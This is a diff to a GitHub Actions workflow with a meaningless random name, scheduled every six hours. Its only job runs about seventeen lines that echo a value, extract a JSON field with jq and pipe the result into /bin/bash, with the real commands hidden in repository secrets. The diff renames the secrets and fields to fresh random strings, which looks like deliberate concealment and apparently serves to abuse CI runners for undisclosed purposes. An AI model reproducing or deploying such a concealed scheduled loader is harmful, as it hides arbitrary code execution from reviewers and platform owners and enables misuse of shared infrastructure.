@@ -1,35 +1,35 @@
 name: wangsilu6758
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 0/6 * * *'
+    - cron: '8 1/6 * * *'
 
-jobs:  # 4359
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: wangsilu6758
         env:
-          g05: ${{ secrets.g05 }}
+          ojf429: ${{ secrets.ojf429 }}
         run: |
-          echo $g05 | jq -r .opq57036 | /bin/bash
-          echo $guthq9 | jq -r .hv754 | /bin/bash
-          echo $xg6968 | jq -r .y1082 | /bin/bash
-          echo $t8573 | jq -r .fchtt17 | /bin/bash
-          echo $mx53 | jq -r .n48 | /bin/bash
-          echo $jaxyd93 | jq -r .dw17 | /bin/bash
-          echo $n409 | jq -r .wjsr5666 | /bin/bash
-          echo $psqy30355 | jq -r .piewf011 | /bin/bash
-          echo $bwybk499 | jq -r .x32283 | /bin/bash
-          echo $cwg6072 | jq -r .nhbl77083 | /bin/bash
-          echo $mfxe447 | jq -r .bgjf3430 | /bin/bash
-          echo $suh04395 | jq -r .vy02 | /bin/bash
-          echo $qjdc479 | jq -r .edf12 | /bin/bash
-          echo $djnm2795 | jq -r .spn58 | /bin/bash
-          echo $z6084 | jq -r .wulw776 | /bin/bash
-          echo $bkq597 | jq -r .d15605 | /bin/bash
-          echo $xci9677 | jq -r .ogxi8 | /bin/bash
-          echo $qvkdx55965 | jq -r .tze7 | /bin/bash
-          echo $epxn77 | jq -r .y4566 | /bin/bash
+          echo $ojf429 | jq -r .nrvij5797 | /bin/bash
+          echo $mpii09789 | jq -r .glwyt4087 | /bin/bash
+          echo $af01751 | jq -r .w2059 | /bin/bash
+          echo $ixzy1544 | jq -r .tayu3 | /bin/bash
+          echo $hz313 | jq -r .dj44 | /bin/bash
+          echo $q3 | jq -r .yw6346 | /bin/bash
+          echo $v42 | jq -r .vts80800 | /bin/bash
+          echo $j8 | jq -r .oxka75 | /bin/bash
+          echo $tmn1577 | jq -r .v67405 | /bin/bash
+          echo $m415 | jq -r .plwr76692 | /bin/bash
+          echo $h39433 | jq -r .xeit4 | /bin/bash
+          echo $mmctp9 | jq -r .igq2 | /bin/bash
+          echo $i696 | jq -r .cpf81 | /bin/bash
+          echo $zsibw86 | jq -r .mmst55439 | /bin/bash
+          echo $ea2 | jq -r .kxrfc011 | /bin/bash
+          echo $eqtw64 | jq -r .velo8 | /bin/bash
+          echo $baxjz5 | jq -r .c811 | /bin/bash
 
